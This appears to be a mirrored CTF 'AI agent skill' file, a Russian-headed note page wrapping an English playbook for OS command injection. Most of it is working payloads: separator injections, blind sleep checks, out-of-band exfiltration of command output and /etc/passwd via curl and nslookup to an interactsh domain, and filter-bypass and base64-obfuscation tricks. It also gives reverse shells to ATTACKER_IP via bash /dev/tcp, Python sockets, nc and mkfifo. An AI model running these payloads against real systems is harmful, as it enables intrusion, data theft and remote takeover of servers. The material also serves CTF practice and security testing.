# OS Command Injection

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/command-injection.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/command-injection.md)

---

---
name: command-injection
category: web
triggers: [rce, "command injection", "os command", "shell injection", "ping", "nslookup", "argument injection", ";id", "|whoami", "$(", backtick, "blind command injection", collaborator, "oob dns"]
tools: [curl, interactsh, burp-collaborator, nc, sqlmap]
priority: high
description: Detect and exploit OS command injection — direct, blind, and out-of-band — plus filter/space bypass and reverse shells.
---
# OS Command Injection

## Trigger context
- App shells out with user input: ping/traceroute/nslookup tools, PDF/image converters (ImageMagick, ffmpeg), DNS lookups, `host=`, `ip=`, `cmd=`, `filename=`, network diagnostics, `git`/`tar`/`zip` wrappers.
- Any field that ends up in `system()`, `exec()`, `popen()`, `subprocess(..., shell=True)`, backticks, `Runtime.exec`.
- Signals: output includes command results (uptime, ping stats), errors mention `sh:`, `/bin/`, or the app runs slower on injected sleeps.

## Objective
Prove arbitrary command execution, then upgrade to an interactive/reverse shell and capture the flag.

## Methodology (decision tree)
1. Identify the separator context (is input inside a larger command? quoted?). Try each metacharacter.
2. Test DIRECT injection first — inject a command whose output is reflected (`;id`, `|id`).
3. If no output reflected -> assume BLIND. Confirm with a time delay (`;sleep 5`) — response stalls.
4. If time works but you need data -> OUT-OF-BAND: exfiltrate via DNS/HTTP to a collaborator/interactsh.
5. If metacharacters are filtered -> apply filter-bypass (space, keyword, char bypass).
6. Escalate: reverse shell -> stabilize -> loot flag.

## Commands & payloads
```bash
# 2. Direct detection — try separators (URL-encode & as %26, ; as %3B, | as %7C)
;id            | id            & id            && id            `id`     $(id)
%0aid          # newline separator (bypasses many inline filters)
# with a preceding value the app expects:
127.0.0.1;id
127.0.0.1|id
127.0.0.1 && whoami

# 3. Blind — time oracle (both branches so it works regardless of context)
127.0.0.1; sleep 5
127.0.0.1 && ping -c 5 127.0.0.1
& timeout /t 5 &        # Windows

# 4. Out-of-band (DNS/HTTP) — run interactsh-client first, use the shown domain
; nslookup $(whoami).OOB.oast.pro
; curl http://OOB.oast.pro/$(id | base64)
& nslookup %USERNAME%.OOB.oast.pro &      # Windows
# exfil a file over DNS/HTTP
; curl http://OOB.oast.pro/ -d "@/etc/passwd"
```
```bash
# 5. Filter bypass
# spaces blocked -> ${IFS}, tabs, brace expansion, <
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'\x20';cat${X}/etc/passwd
# keyword blacklist (e.g. "cat","flag") -> quotes/backslash/globbing/concat break the string
c""at /etc/pas''swd
c\at /et\c/pa\sswd
/bin/c?t /etc/passwd            # wildcard
/bin/cat /f???/f???            # glob unknown names
who$@ami ; ca$@t /etc/passwd    # $@ / ${} noise
# alternate reads / no-space
tac /etc/passwd; nl /etc/passwd; head -c 200 /etc/passwd
# base64-encode the whole command to dodge char filters
echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash
# reverse a blocked string
$(rev<<<'dwssap/cte/ tac')
```
```bash
# 6. Reverse shells (start listener:  nc -lvnp 4444)
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; sh -i 5<> /dev/tcp/ATTACKER_IP/4444 0<&5 1>&5 2>&5
; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
; nc -e /bin/sh ATTACKER_IP 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
# base64-encoded bash reverse shell (avoids quoting hell in the URL param)
; echo BASE64_OF_BASH_REVSHELL | base64 -d | bash
```
```bash
# Stabilize a caught shell
python3 -c 'import pty;pty.spawn("/bin/bash")'   # then: Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

## Branching logic
- If command output reflected -> direct; just run `cat flag`.
- If only a time delay reacts -> blind; switch to OOB exfil or time-based char extraction.
- If DNS callbacks arrive but HTTP doesn't -> egress-filtered; stick to DNS exfil (base32/hex chunk the data).
- If reverse shell blocked by egress -> bind shell, or fetch flag over the working OOB channel.
- If it's actually a Python/PHP eval sink, not a shell -> pivot to code-injection/deserialization; template rendering -> [ssti](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssti.md).
- If injection is in an upload/convert feature (ImageMagick) -> known CVE polyglots.

## Common pitfalls
- Not URL-encoding metacharacters (`&`->`%26`, `+`->`%2B`, space->`%20`/`+`) -> payload mangled by the query parser.
- Testing only `;` — the app may use `|`, `&&`, newline, or `$( )`; try all.
- Assuming output when it's blind — always keep a `sleep`/OOB confirmation ready.
- Windows vs Linux: use `&`/`&&`/`|`, `timeout /t`, `%VAR%`, `nslookup`, `certutil` — not bash syntax.
- `-c` count on `ping`: Linux `-c`, Windows `-n`. Wrong flag = no delay = false negative.
- Quoting inside the vulnerable command can swallow your payload; break out with the right quote first.

## Proof / verification
- Deterministic: `sleep N` scales response time with N; OOB shows a callback containing `whoami`/hostname.
- Capture flag: `id`/`hostname` to prove RCE, then `find / -name 'flag*' 2>/dev/null`, `cat /flag*`, `env | grep -i flag`.
- OOB-only: `; cat /flag | base64 | tr -d '\n' | fold -w60 | while read c; do curl -s http://OOB/$c; done` (or DNS chunks).

## Cross-references
[web-recon](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--web-recon.md) · [ssti](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssti.md) · [sql-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--sql-injection.md)

## Credible sources
- https://portswigger.net/web-security/os-command-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
- https://gtfobins.github.io/
- https://owasp.org/www-community/attacks/Command_Injection
